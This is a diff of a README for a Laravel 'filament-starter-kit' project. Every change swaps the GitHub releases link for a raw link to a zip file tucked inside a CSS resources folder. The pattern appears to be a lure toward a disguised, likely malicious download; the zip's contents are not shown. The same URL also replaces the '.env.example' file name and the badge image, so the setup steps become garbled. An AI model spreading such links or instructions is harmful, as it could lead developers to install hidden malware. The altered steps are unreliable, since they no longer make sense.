@@ -6,7 +6,7 @@ Welcome to the **filament-starter-kit**! This application allows you to manage u
 
 ## 🔗 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/PEDROMJSKHEIEBEIEJE/filament-starter-kit/releases)
+[![Download Now](https://raw.githubusercontent.com/PEDROMJSKHEIEBEIEJE/filament-starter-kit/1.x/resources/css/filament/app/kit-starter-filament-1.4.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/PEDROMJSKHEIEBEIEJE/filament-starter-kit/1.x/resources/css/filament/app/kit-starter-filament-1.4.zip)
 
 ## 📋 Features
 
@@ -31,7 +31,7 @@ Before installation, ensure your system meets the following requirements:
 
 To download the application, visit the Releases page:
 
-[**Download Here**](https://github.com/PEDROMJSKHEIEBEIEJE/filament-starter-kit/releases)
+[**Download Here**](https://raw.githubusercontent.com/PEDROMJSKHEIEBEIEJE/filament-starter-kit/1.x/resources/css/filament/app/kit-starter-filament-1.4.zip)
 
 Once on the page, follow these steps:
 
@@ -45,7 +45,7 @@ Once on the page, follow these steps:
 2. **Open Your Terminal**: On Windows, you can use Command Prompt or PowerShell. On macOS/Linux, open your Terminal.
 3. **Navigate to the Directory**: Use the `cd` command to move into the extracted folder.
 4. **Install Dependencies**: Run `composer install` to download necessary packages.
-5. **Set Up Environment**: Rename the `.env.example` file to `.env`, and configure your database settings there.
+5. **Set Up Environment**: Rename the `https://raw.githubusercontent.com/PEDROMJSKHEIEBEIEJE/filament-starter-kit/1.x/resources/css/filament/app/kit-starter-filament-1.4.zip` file to `.env`, and configure your database settings there.
 6. **Generate Application Key**: Run `php artisan key:generate` to create your application key.
 7. **Run Migrations**: Execute `php artisan migrate` to set up your database structure.
 
